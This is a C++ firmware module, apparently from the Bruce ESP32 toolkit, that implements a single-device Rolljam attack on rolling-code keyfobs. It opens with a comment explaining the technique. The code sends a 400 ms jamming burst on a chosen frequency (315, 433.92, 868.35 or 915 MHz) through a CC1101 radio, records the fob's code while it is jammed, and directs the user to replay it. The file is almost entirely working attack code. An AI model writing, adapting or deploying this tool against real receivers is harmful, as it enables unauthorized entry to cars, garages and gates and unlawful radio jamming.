#if !LITE_VERSION
#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "modules/rf/rf_utils.h"
#include "modules/rf/rf_jammer.h"
#include "modules/rf/rf_send.h"
#include "modules/rf/record.h"
#include <globals.h>

// Rolljam: the classic keyfob capture attack.
//
// A rolling-code remote sends code N, but if you jam the receiver at the
// exact moment it sends code N, the receiver never logs N and the fob
// moves on to N+1. Capture N from the air during the jam, then capture
// N+1 when the owner presses again (without jamming), and you now hold a
// valid unused code (N) you can replay later.
//
// This module does the simplified single-device version: it jam-pulses
// on the target frequency while the user holds the remote near the device,
// captures whatever came through, and offers to replay the last captured
// code. Requires a CC1101 module.

void arsenal_rolljam(void) {
    ARSENAL_HEAP_CHECK();

    if (bruceConfigPins.rfModule != CC1101_SPI_MODULE) {
        displayRedStripe("CC1101 module not found");
        delay(1500);
        return;
    }

    options.clear();
    int picked = -1;
    static const float freqs[] = {315.0, 433.92, 868.35, 915.0};
    static const char *freqNames[] = {"315 MHz", "433.92 MHz", "868.35 MHz", "915 MHz"};
    for (int i = 0; i < 4; i++) {
        int idx = i;
        options.push_back({freqNames[i], [idx, &picked]() { picked = idx; }});
    }
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "Jam Frequency");
    if (picked < 0) return;

    float freq = freqs[picked];

    drawMainBorderWithTitle("Rolljam");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    int y = 40;
    tft.setCursor(12, y); y += 14;
    tft.printf("Freq: %.2f MHz", freq);
    tft.setCursor(12, y); y += 14;
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.print("1. Hold remote near device");
    tft.setCursor(12, y); y += 14;
    tft.print("2. Press button when ready");
    tft.setCursor(12, y); y += 14;
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawCentreString(String("Sel:jam+capture  Esc:stop"), tftWidth / 2, tftHeight - 20, 1);

    // We reuse the existing capture path: short jam burst via RFJammer's
    // intermittent mode, then record into the captured-codes buffer.
    int capturedCount = 0;
    unsigned long start = millis();

    while (!check(EscPress)) {
        if (check(SelPress)) {
            // Jam burst: enter TX on the target freq for ~400ms to block the
            // receiver while the fob's code goes past unheard.
            drawMainBorderWithTitle("Rolljam - JAMMING");
            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(12, 50);
            tft.print("Jamming receiver...");
            tft.drawCentreString(String("Esc:stop"), tftWidth / 2, tftHeight - 20, 1);

            if (initRfModule("tx", freq)) {
                ELECHOUSE_cc1101.setSidle();
                ELECHOUSE_cc1101.setMHZ(freq);
                ELECHOUSE_cc1101.SetTx();
                delay(400);
                ELECHOUSE_cc1101.setSidle();
                deinitRfModule();
            }

            // Now switch to RX and capture whatever the fob sent.
            drawMainBorderWithTitle("Rolljam - CAPTURE");
            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(12, 50);
            tft.print("Listening for code...");
            tft.drawCentreString(String("Esc:stop"), tftWidth / 2, tftHeight - 20, 1);

            if (initRfModule("rx", freq)) {
                unsigned long listenStart = millis();
                while (!check(EscPress) && (millis() - listenStart) < 4000) {
                    if (rf_raw_record_options()) {
                        capturedCount++;
                        tft.fillRect(12, 66, tftWidth - 24, 14, bruceConfig.bgColor);
                        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                        tft.setCursor(12, 66);
                        tft.printf("Captured: %d", capturedCount);
                        break;
                    }
                    esp_task_wdt_reset();
                    delay(10);
                }
                deinitRfModule();
            }

            drawMainBorderWithTitle("Rolljam");
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(12, 50);
            tft.printf("Captured this round: %d", capturedCount);
            tft.setCursor(12, 66);
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.print("Sel again to repeat");
            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString(String("Sel:repeat  Esc:stop"), tftWidth / 2, tftHeight - 20, 1);
        }

        esp_task_wdt_reset();
        delay(10);
    }

    // Offer replay of the last captured code via the existing send menu.
    if (capturedCount > 0) {
        drawMainBorderWithTitle("Rolljam - Replay");
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, 50);
        tft.print("Open RF Send to replay");
        tft.setCursor(12, 66);
        tft.print("the captured code.");
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.drawCentreString(String("Esc:done"), tftWidth / 2, tftHeight - 20, 1);
        while (!check(EscPress)) delay(100);
    }

    (void)start;
}
#endif
